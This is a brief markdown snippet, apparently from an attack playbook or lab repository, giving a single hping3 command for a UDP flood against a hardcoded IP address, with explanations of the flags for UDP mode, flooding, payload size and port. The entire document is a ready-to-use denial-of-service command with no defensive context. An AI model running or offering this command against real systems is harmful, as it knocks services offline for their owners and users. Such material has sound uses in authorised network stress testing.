# UDP Flood - Command Execution

## Attack Command
Run the following command to execute the UDP Flood attack:
hping3 -2 --flood -d <payload_size> -p <port> 192.10.1.1 
-2: Uses UDP mode.
--flood: Sends packets as fast as possible.
-d <payload_size>: Specifies the size of the packet payload in bytes
-p <target_port>: Target port.
<target_ip>: Replace with the target's IP
